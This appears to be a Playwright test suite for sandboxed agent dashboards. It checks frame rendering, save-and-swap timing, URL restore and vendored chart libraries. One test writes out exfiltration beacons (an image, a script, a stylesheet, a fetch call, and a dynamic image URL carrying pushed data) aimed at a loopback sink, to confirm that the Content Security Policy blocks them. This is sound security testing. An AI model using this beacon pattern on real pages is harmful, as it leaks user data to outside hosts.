import { readFileSync } from 'node:fs'
import { createServer, type Server } from 'node:http'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { expect, test, type APIRequestContext } from '@playwright/test'
import { gotoApp } from './helpers'

/*
 * Agent dashboards, web host half (GDK-782/793; vendor GDK-792) — against the
 * real serve binary. The four contracts this file pins:
 *
 *  1. opening from the sidebar renders the example dashboard inside the
 *     sandboxed frame and every datasource's data arrives (postMessage).
 *  2. `dashboards save` on an open dashboard swaps the whole frame without
 *     reloading the page — the GDK-793 p95 ≤ 1s authoring contract.
 *  3. the frame's own outbound attempts never reach the network: CSP refuses
 *     img/script/style/fetch to an external host before a request is made.
 *  4. the vendored chart libraries load inside the opaque-origin frame:
 *     uPlot draws a canvas (test 1's dashboard), three's ESM import chain
 *     with its relative core import resolves (test 5).
 *
 * Fixture hygiene: dashboard rows live in local.db, which serve.sh seeds
 * fresh per server start — but reuseExistingServer keeps one server alive
 * across local runs, so every test names its rows with PREFIX and the sweep
 * in beforeAll/afterAll deletes them (a crashed run is cleaned by the next
 * run's beforeAll).
 */

const E2E_DIR = dirname(fileURLToPath(import.meta.url))
const RUN = Date.now().toString(36)
const PREFIX = 'E2E Dash'
const FRAME_SEL = 'iframe[data-testid="dashboard-frame"]'

/** The example's own registration comment is the source of truth for these. */
const TRIAGE_DS = {
  by_status: {
    sql: 'select status_category, count(*) as n from issues_full group by 1 order by 1',
  },
  top_open: {
    sql: "select key, priority_rank, summary from issues_full where status_category != 'done' order by priority_rank, updated_at desc limit 8",
  },
  monthly_opened: {
    sql: "select strftime('%s', substr(created_at, 1, 7) || '-01') as t, count(*) as n from issues_full where created_at >= date('now', '-11 months') group by 1 order by 1",
  },
  mine: { jql: 'assignee = currentUser() AND resolution is EMPTY' },
}

const TOTAL_DS = { total: { sql: 'select count(*) as n from issues_full' } }

type SavedRow = { id: string; name: string }

async function saveDash(
  request: APIRequestContext,
  name: string,
  html: string,
  datasources: Record<string, { sql?: string; jql?: string }>,
): Promise<SavedRow> {
  const res = await request.post('/api/v1/dashboards/', {
    data: { name, config: { html, datasources } },
  })
  expect(res.status(), `save ${name} failed: ${await res.text()}`).toBe(201)
  return (await res.json()) as SavedRow
}

/** Delete every dashboard this file (or a crashed earlier run) created. */
async function sweep(request: APIRequestContext): Promise<void> {
  const res = await request.get('/api/v1/dashboards/')
  if (!res.ok()) return
  const { dashboards } = (await res.json()) as { dashboards: SavedRow[] }
  for (const d of dashboards) {
    if (d.name.startsWith(PREFIX)) await request.delete(`/api/v1/dashboards/${d.id}/`)
  }
}

/** Minimal authored document: a version marker plus the pushed row count. */
function markerHtml(marker: string): string {
  return `<!doctype html><html><body style="font: 14px sans-serif">
<div data-testid="dash-version">${marker}</div>
<div id="pushed">waiting</div>
<script>
window.addEventListener('message', function (ev) {
  var d = ev.data;
  if (!d || d.type !== 'data' || d.name !== 'total') return;
  var i = d.columns.indexOf('n');
  document.getElementById('pushed').textContent =
    String(i >= 0 && d.rows[0] ? d.rows[0][i] : '0') + (d.warning ? ' warn:' + d.warning : '');
});
</script>
</body></html>`
}

test.beforeAll(async ({ request }) => {
  await sweep(request)
})
test.afterAll(async ({ request }) => {
  await sweep(request)
})

test('open from the sidebar renders the example wall and every datasource arrives', async ({
  page,
}) => {
  const name = `${PREFIX} ${RUN} triage`
  const html = readFileSync(
    join(E2E_DIR, '..', 'examples', 'dashboards', 'triage.html'),
    'utf8',
  )
  const saved = await saveDash(page.request, name, html, TRIAGE_DS)

  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  await expect(page).toHaveURL(/dash=/)

  const fl = page.frameLocator(FRAME_SEL)
  // Data arrival: the stamp counts datasources that pushed (a failed one
  // still pushes, with a warning), and the open-count card left its dash.
  await expect(fl.locator('#stamp')).toHaveText('4/4 datasources')
  // Non-zero: the demo pool always has open work (see DEMO_ISSUE_COUNT for
  // the single-owner constant pattern this intentionally avoids).
  await expect(fl.locator('#n-open')).toHaveText(/^[1-9][0-9]*$/)
  // GDK-792, in situ: uPlot loaded from the vendor route and drew a canvas.
  await expect(fl.locator('#monthly canvas').first()).toBeVisible()
})

test('the dash= URL param restores the dashboard on a cold boot', async ({ page }) => {
  const saved = await saveDash(
    page.request,
    `${PREFIX} ${RUN} restore`,
    markerHtml('v1'),
    TOTAL_DS,
  )
  // Cold boot straight into the param — no sidebar, restore-before-bind.
  await page.goto(`/#/?dash=${saved.id}`)
  await expect(page.getByTestId('dashboard-view')).toBeVisible()
  const fl = page.frameLocator(FRAME_SEL)
  await expect(fl.getByTestId('dash-version')).toHaveText('v1')
  // The first push landed too — restore is not a blank frame.
  await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)

  await page.getByTestId('dashboard-close').click()
  await expect(page.getByTestId('dashboard-view')).toBeHidden()
  await expect(page.getByTestId('issue-layout')).toBeVisible()
})

test('save on an open dashboard swaps the frame without a reload (p95 <= 1s)', async ({
  page,
}) => {
  const name = `${PREFIX} ${RUN} swap`
  const saved = await saveDash(page.request, name, markerHtml('v1'), TOTAL_DS)

  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  const fl = page.frameLocator(FRAME_SEL)
  await expect(fl.getByTestId('dash-version')).toHaveText('v1')
  await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)
  // A page reload would wipe this; a frame swap must not touch it.
  await page.evaluate(() => {
    ;(window as { __e2eNoReload?: number }).__e2eNoReload = 1
  })

  const samples: number[] = []
  for (let gen = 1; gen <= 3; gen++) {
    const t0 = Date.now()
    await saveDash(page.request, name, markerHtml(`v${gen + 1}`), TOTAL_DS)
    // renderGen is the swap signal: the {#key} wrapper re-created the frame.
    await expect(page.locator(FRAME_SEL)).toHaveAttribute('data-render-gen', String(gen), {
      timeout: 5000,
    })
    await expect(fl.getByTestId('dash-version')).toHaveText(`v${gen + 1}`)
    // And the new document got its first push (the swap contract is
    // "replace, then push" — not "replace and go dark").
    await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)
    samples.push(Date.now() - t0)
  }

  samples.sort((a, b) => a - b)
  const median = samples[1]
  console.log(`[dashboards] save→swap samples ${samples.join('/')}ms (median ${median}ms)`)
  expect(
    median,
    `save→swap median ${samples.join('/')}ms — over the 1s p95 contract (0.5s poll + one row fetch)`,
  ).toBeLessThanOrEqual(1000)
  expect(Math.max(...samples)).toBeLessThan(4000)
  expect(await page.evaluate(() => (window as { __e2eNoReload?: number }).__e2eNoReload)).toBe(1)
})

test("the frame's outbound attempts are refused before any socket is opened", async ({ page }) => {
  // The observable matters. Chromium creates a request OBJECT for a
  // CSP-refused subresource and then discards it before connecting — so
  // page.on('request') / devtools' network panel show canceled entries for
  // loads that never sent a byte (measured here during GDK-792: 4 CDP
  // request events, 0 TCP connections). The contract this test pins is at
  // the socket: a loopback sink receives nothing. The sink is also the
  // containment — even on a CSP regression, the "external" host is 127.0.0.1.
  const received: string[] = []
  const sink: Server = createServer((req, res) => {
    received.push(`${req.method} ${req.url}`)
    // The external script must be executable if it ever arrives: a 404 would
    // mask a CSP regression as a load error. Serving it is what makes the
    // in-frame #ext assertion meaningful.
    if ((req.url ?? '').includes('static-js')) {
      res.writeHead(200, { 'content-type': 'application/javascript' })
      res.end("document.getElementById('ext').textContent = 'EXECUTED';")
      return
    }
    res.writeHead(404)
    res.end()
  })
  await new Promise<void>((resolve) => sink.listen(0, '127.0.0.1', resolve))
  const sinkPort = (sink.address() as { port: number }).port
  const beacon = (path: string) => `http://127.0.0.1:${sinkPort}/${path}`

  const html = `<!doctype html><html><head>
<link rel="stylesheet" href="${beacon('static-css?d=secret')}">
<script src="${beacon('static-js?d=secret')}"></script>
</head><body>
<img src="${beacon('static-pixel?d=secret')}"
     onload="document.getElementById('img').textContent = 'LOADED (leak)'"
     onerror="document.getElementById('img').textContent = 'refused'">
<div id="img">pending</div>
<div id="fetch">pending</div>
<div id="ran">no</div>
<div id="ext">no</div>
<div id="dyn">pending</div>
<div id="pushed">waiting</div>
<script>
document.getElementById('ran').textContent = 'yes';
fetch('${beacon('fetch-beacon?d=secret')}').then(
  function () { document.getElementById('fetch').textContent = 'LOADED (leak)'; },
  function (e) { document.getElementById('fetch').textContent = 'refused ' + e.name; }
);
window.addEventListener('message', function (ev) {
  var d = ev.data;
  if (!d || d.type !== 'data' || d.name !== 'total') return;
  var i = d.columns.indexOf('n');
  document.getElementById('pushed').textContent = String(i >= 0 && d.rows[0] ? d.rows[0][i] : '0');
  // The exfiltration shape that matters: pushed mirror data encoded into a
  // dynamically constructed subresource URL after it arrives.
  var b = document.createElement('img');
  b.src = '${beacon('dyn-beacon')}?d=' + encodeURIComponent(document.getElementById('pushed').textContent);
  b.onload = function () { document.getElementById('dyn').textContent = 'LOADED (leak)'; };
  b.onerror = function () { document.getElementById('dyn').textContent = 'refused'; };
  document.body.appendChild(b);
});
</script>
</body></html>`
  const saved = await saveDash(page.request, `${PREFIX} ${RUN} blockednet`, html, TOTAL_DS)

  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  const fl = page.frameLocator(FRAME_SEL)
  // The document itself ran, and each channel was refused in-frame: no
  // external script executed, image/fetch got errors, not content…
  await expect(fl.locator('#ran')).toHaveText('yes')
  await expect(fl.locator('#ext')).toHaveText('no')
  await expect(fl.locator('#fetch')).toHaveText(/^refused /)
  await expect(fl.locator('#img')).toHaveText('refused')
  // …while the host side kept working (pushes are the parent's job), and the
  // dynamic beacon built FROM pushed data was refused too.
  await expect(fl.locator('#pushed')).toHaveText(/^[1-9][0-9]*$/)
  await expect(fl.locator('#dyn')).toHaveText('refused')
  // The duration is the assertion window: any refused-but-issued load, or a
  // deferred beacon, would land on the sink inside it.
  await page.waitForTimeout(800)
  expect(
    received,
    `requests reached a socket: ${received.join(', ')} (CSP refused them only in-frame)`,
  ).toEqual([])
  sink.close()
})

test("three's ESM chain resolves from the vendor route inside the frame", async ({ page }) => {
  const html = `<!doctype html><html><body style="font: 14px sans-serif">
<div id="three-ok">pending</div>
<script type="module">
import * as THREE from '/api/v1/dashboards/vendor/three.module.min.js';
document.getElementById('three-ok').textContent = 'THREE r' + THREE.REVISION;
</script>
</body></html>`
  const saved = await saveDash(page.request, `${PREFIX} ${RUN} vendor3`, html, {})
  // module {} — static HTML dashboard is valid (ParseConfig allows empty datasources)

  await gotoApp(page)
  await page.locator(`[data-dashboard-id="${saved.id}"]`).click()
  // three.module.min.js imports ./three.core.min.js relatively; if the route
  // did not serve the core file, this stays "pending" and the test times out.
  await expect(page.frameLocator(FRAME_SEL).locator('#three-ok')).toHaveText(/^THREE r[\w.]+$/)
})
